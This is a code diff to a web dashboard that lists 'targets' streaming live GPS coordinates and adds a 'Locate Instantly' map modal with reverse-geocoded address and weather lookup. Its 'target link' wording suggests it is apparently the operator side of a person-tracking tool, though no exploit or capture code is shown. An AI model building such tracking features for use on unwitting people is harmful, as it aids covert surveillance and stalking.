@@ -11,6 +11,7 @@
     <!-- CSS & Font Libraries -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/1.0.2/css/bulma.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     
     <style>
@@ -357,7 +358,7 @@
                         <div id="tar-content" class="is-flex is-flex-direction-column">
                             <!-- Loop over initially loaded targets -->
                             {{ for(value, key in TARGETS) }}
-                            <div class="target-card p-4 mb-3 is-flex is-justify-content-between is-align-items-center" data-target-id="{{ key }}">
+                            <div class="target-card p-4 mb-3 is-flex is-justify-content-between is-align-items-center" data-target-id="{{ key }}" data-lat="{{ value[0] }}" data-lng="{{ value[1] }}">
                                 <div class="is-flex is-align-items-center">
                                     <div class="radar-wave-active mr-3" style="display: inline-flex; align-items: center; justify-content: center; width: 14px; height: 14px;">
                                         <span class="pulse-indicator" style="margin-right: 0;"></span>
@@ -367,10 +368,16 @@
                                         <p class="has-text-grey is-size-7 mt-1">Actively broadcasting telemetry</p>
                                     </div>
                                 </div>
-                                <a href="/map?id={{ key }}" class="button is-small is-link is-outlined">
-                                    <span class="icon is-small"><i class="fas fa-map-marked-alt"></i></span>
-                                    <span>Open Live Map</span>
-                                </a>
+                                <div class="is-flex" style="gap: 8px;">
+                                    <button onclick="locateInstantly('{{ key }}')" class="button is-small is-success is-outlined">
+                                        <span class="icon is-small"><i class="fas fa-crosshairs"></i></span>
+                                        <span>Locate Instantly</span>
+                                    </button>
+                                    <a href="/map?id={{ key }}" class="button is-small is-link is-outlined">
+                                        <span class="icon is-small"><i class="fas fa-map-marked-alt"></i></span>
+                                        <span>Open Live Map</span>
+                                    </a>
+                                </div>
                             </div>
                             {{/}}
                         </div>
@@ -500,6 +507,51 @@
         </div>
     </div>
 
+    <!-- Instant Device Finder Modal -->
+    <div id="finder-modal" class="modal">
+        <div class="modal-background"></div>
+        <div class="modal-card" style="border: 1px solid var(--card-border); border-radius: 12px; overflow: hidden; box-shadow: 0 10px 35px rgba(0,0,0,0.7); max-width: 650px; width: 90%;">
+            <header class="modal-card-head" style="background-color: #161b22; border-bottom: 1px solid var(--card-border); display: flex; align-items: center; justify-content: space-between; padding: 16px 20px;">
+                <p class="modal-card-title has-text-white" style="font-size: 1.15rem; font-weight: 600; display: flex; align-items: center; gap: 8px; margin: 0;">
+                    <span class="icon has-text-info animated-satellite"><i class="fas fa-satellite-dish"></i></span>
+                    <span>Instant Finder: <strong id="finder-title-id" style="color: #58a6ff;">Target</strong></span>
+                </p>
+                <button class="delete" aria-label="close" id="close-finder-modal-btn"></button>
+            </header>
+            <section class="modal-card-body" style="background-color: #0d1117; color: #c9d1d9; padding: 0; position: relative; height: 400px;">
+                <!-- Telemetry HUD Overlay -->
+                <div id="finder-hud" style="position: absolute; top: 12px; left: 12px; z-index: 1000; background: rgba(13, 17, 23, 0.9); border: 1px solid #30363d; padding: 8px 12px; border-radius: 6px; font-size: 12px; pointer-events: none; backdrop-filter: blur(4px); box-shadow: 0 4px 12px rgba(0,0,0,0.5);">
+                    <div style="display: flex; align-items: center; gap: 6px; margin-bottom: 4px;">
+                        <span style="color: #58a6ff; font-weight: bold;">TELEMETRY:</span>
+                        <span id="finder-status" style="color: #3fb950; display: inline-flex; align-items: center; gap: 4px;">
+                            <span class="pulse-indicator" style="width: 8px; height: 8px; margin-right: 0;"></span> Live
+                        </span>
+                    </div>
+                    <div><span style="color: #8b949e;">LAT:</span> <span id="finder-lat" style="color: #ffffff; font-family: monospace; font-weight: 500;">Loading...</span></div>
+                    <div><span style="color: #8b949e;">LNG:</span> <span id="finder-lng" style="color: #ffffff; font-family: monospace; font-weight: 500;">Loading...</span></div>
+                    <div id="finder-location-info" style="margin-top: 4px; border-top: 1px solid #30363d; padding-top: 4px; color: #58a6ff; font-size: 11px; max-width: 200px;">
+                        <span style="color: #8b949e;">ADDR:</span> <span id="finder-addr-text">Resolving position...</span>
+                    </div>
+                </div>
+
+                <!-- Live Map Container inside Modal -->
+                <div id="finder-map" style="height: 100%; width: 100%;"></div>
+            </section>
+            <footer class="modal-card-foot" style="background-color: #161b22; border-top: 1px solid var(--card-border); display: flex; justify-content: space-between; align-items: center; padding: 12px 20px;">
+                <p class="is-size-7 has-text-grey" style="margin: 0;">
+                    <i class="fas fa-sync fa-spin mr-1 has-text-info"></i> WebSocket telemetry channel active
+                </p>
+                <div style="display: flex; gap: 8px;">
+                    <button class="button is-small is-dark" id="finder-recenter-btn" style="border-color: #30363d; color: #c9d1d9; background-color: #21262d;">
+                        <span class="icon is-small"><i class="fas fa-crosshairs"></i></span>
+                        <span>Recenter</span>
+                    </button>
+                    <button class="button is-link is-small" id="close-finder-modal-btn-footer">Close Finder</button>
+                </div>
+            </footer>
+        </div>
+    </div>
+
     <!-- Vanta.js & Three.js Animated Background -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.24/dist/vanta.net.min.js"></script>
@@ -523,12 +575,16 @@
 
 
 
-    <!-- WebSocket Telemetry Handler -->
+    <!-- WebSocket Telemetry & Leaflet Map Handler -->
     <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
     <script>
         const content = document.querySelector("#tar-content");
         const emptyState = document.querySelector("#empty-state");
         const activeCount = document.querySelector("#active-count");
+
+        // Client-side registry to hold current target coordinates
+        const localTargets = {};
 
         // Helper to update active targets count
         function updateStats() {
@@ -542,6 +598,16 @@
                 activeCount.className = "tag is-dark";
             }
         }
+
+        // Parse any initially loaded targets from Tarkine server rendering
+        document.querySelectorAll("[data-target-id]").forEach(el => {
+            const tid = el.getAttribute("data-target-id");
+            const lat = parseFloat(el.getAttribute("data-lat"));
+            const lng = parseFloat(el.getAttribute("data-lng"));
+            if (tid && !isNaN(lat) && !isNaN(lng)) {
+                localTargets[tid] = [lat, lng];
+            }
+        });
 
         // Initialize Stats
         updateStats();
@@ -562,6 +628,8 @@
             const card = document.createElement('div');
             card.className = "target-card p-4 mb-3 is-flex is-justify-content-between is-align-items-center";
             card.setAttribute("data-target-id", newId);
+            card.setAttribute("data-lat", "0");
+            card.setAttribute("data-lng", "0");
             card.innerHTML = `
                 <div class="is-flex is-align-items-center">
                     <div class="radar-wave-active mr-3" style="display: inline-flex; align-items: center; justify-content: center; width: 14px; height: 14px;">
@@ -572,15 +640,180 @@
                         <p class="has-text-grey is-size-7 mt-1">Actively broadcasting telemetry</p>
                     </div>
                 </div>
-                <a href="/map?id=${newId}" class="button is-small is-link is-outlined">
-                    <span class="icon is-small"><i class="fas fa-map-marked-alt"></i></span>
-                    <span>Open Live Map</span>
-                </a>
+                <div class="is-flex" style="gap: 8px;">
+                    <button onclick="locateInstantly('${newId}')" class="button is-small is-success is-outlined">
+                        <span class="icon is-small"><i class="fas fa-crosshairs"></i></span>
+                        <span>Locate Instantly</span>
+                    </button>
+                    <a href="/map?id=${newId}" class="button is-small is-link is-outlined">
+                        <span class="icon is-small"><i class="fas fa-map-marked-alt"></i></span>
+                        <span>Open Live Map</span>
+                    </a>
+                </div>
             `;
             
             content.appendChild(card);
             updateStats();
         });
+
+        // Listen for live coordinate streams via Socket
+        socket.on("map-data", data => {
+            // Save coordinates in memory
+            localTargets[data.id] = [data.lat, data.lng];
+
+            // Update HTML data attributes on target card
+            const cardEl = document.querySelector(`[data-target-id="${data.id}"]`);
+            if (cardEl) {
+                cardEl.setAttribute("data-lat", data.lat);
+                cardEl.setAttribute("data-lng", data.lng);
+            }
+
+            // Live-update Finder Map/HUD if this device is being actively tracked in modal
+            if (activeTrackId === data.id) {
+                updateFinderTarget(data.id, data.lat, data.lng);
+            }
+        });
+
+        // Instant Finder State and Map Handlers
+        let activeTrackId = null;
+        let finderMap = null;
+        let finderMarker = null;
+
+        const finderModal = document.getElementById("finder-modal");
+        const finderTitleId = document.getElementById("finder-title-id");
+        const finderLat = document.getElementById("finder-lat");
+        const finderLng = document.getElementById("finder-lng");
+        const finderAddrText = document.getElementById("finder-addr-text");
+
+        function locateInstantly(id) {
+            activeTrackId = id;
+            finderTitleId.innerText = id;
+            
+            // Show Finder modal
+            if (finderModal) {
+                finderModal.classList.add("is-active");
+            }
+
+            // Fallback to center of ocean if coords aren't registered yet
+            const coords = localTargets[id] || [0, 0];
+            const lat = coords[0];
+            const lng = coords[1];
+
+            finderLat.innerText = lat.toFixed(6);
+            finderLng.innerText = lng.toFixed(6);
+            finderAddrText.innerText = "Resolving position...";
+
+            // Initialize or relocate map
+            setTimeout(() => {
+                if (!finderMap) {
+                    finderMap = L.map('finder-map').setView(coords, 14);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                        maxZoom: 19,
+                    }).addTo(finderMap);
+                    finderMarker = L.marker(coords).addTo(finderMap);
+                } else {
+                    finderMap.setView(coords, 14);
+                    finderMarker.setLatLng(coords);
+                }
+                finderMap.invalidateSize();
+                
+                // Load reverse geocoded address and real weather telemetry
+                if (lat !== 0 && lng !== 0) {
+                    fetchExtraInfo(lat, lng);
+                } else {
+                    finderAddrText.innerText = "Waiting for initial GPS signal...";
+                }
+            }, 100);
+        }
+
+        // Live coordinate update callback when websocket packet comes in
+        function updateFinderTarget(id, lat, lng) {
+            const coords = [lat, lng];
+            finderLat.innerText = lat.toFixed(6);
+            finderLng.innerText = lng.toFixed(6);
+
+            if (finderMap) {
+                finderMarker.setLatLng(coords);
+                finderMap.panTo(coords);
+            }
+        }
+
+        // Retrieve Reverse Geocoding Address and real current weather from open APIs
+        async function fetchExtraInfo(lat, lng) {
+            try {
+                // Address geocode
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.display_name) {
+                            const addr = data.address;
+                            const city = addr.city || addr.town || addr.village || addr.suburb || "Unknown Location";
+                            const country = addr.country || "";
+                            finderAddrText.innerText = `${city}${country ? ', ' + country : ''}`;
+                        } else {
+                            finderAddrText.innerText = "Remote Position";
+                        }
+                    })
+                    .catch(() => {
+                        finderAddrText.innerText = `Coordinates: ${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+                    });
+
+                // Weather forecasts
+                fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current_weather=true`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data && data.current_weather) {
+                            const temp = data.current_weather.temperature;
+                            const code = data.current_weather.weathercode;
+                            
+                            let cond = "Clear";
+                            if (code >= 1 && code <= 3) cond = "Partly Cloudy";
+                            else if (code >= 45 && code <= 48) cond = "Foggy";
+                            else if (code >= 51 && code <= 67) cond = "Drizzle/Rain";
+                            else if (code >= 71 && code <= 77) cond = "Snowing";
+                            else if (code >= 80 && code <= 82) cond = "Showers";
+                            else if (code >= 95) cond = "Thunderstorm";
+
+                            const weatherLabel = `${temp}°C - ${cond}`;
+                            finderAddrText.innerHTML += `<br><span style="color: #ffbc40; font-weight: 500;"><i class="fas fa-cloud-sun mr-1"></i> ${weatherLabel}</span>`;
+                        }
+                    })
+                    .catch(err => console.log("Meteo error", err));
+            } catch (e) {
+                console.error("Geocoding details fetch failure", e);
+            }
+        }
+
+        // Finder Modal Close Handlers
+        const closeFinderModalBtn = document.getElementById("close-finder-modal-btn");
+        const closeFinderModalBtnFooter = document.getElementById("close-finder-modal-btn-footer");
+
+        function closeFinderModal() {
+            if (finderModal) {
+                finderModal.classList.remove("is-active");
+            }
+            activeTrackId = null;
+        }
+
+        if (closeFinderModalBtn) closeFinderModalBtn.addEventListener("click", closeFinderModal);
+        if (closeFinderModalBtnFooter) closeFinderModalBtnFooter.addEventListener("click", closeFinderModal);
+        if (finderModal) {
+            const finderBg = finderModal.querySelector(".modal-background");
+            if (finderBg) finderBg.addEventListener("click", closeFinderModal);
+        }
+
+        // Recentering event handler
+        const finderRecenterBtn = document.getElementById("finder-recenter-btn");
+        if (finderRecenterBtn) {
+            finderRecenterBtn.addEventListener("click", () => {
+                if (activeTrackId && finderMap) {
+                    const coords = localTargets[activeTrackId];
+                    if (coords) {
+                        finderMap.setView(coords, 14);
+                    }
+                }
+            });
+        }
 
         // Copy Target link to clipboard function
         function copyTargetUrl() {
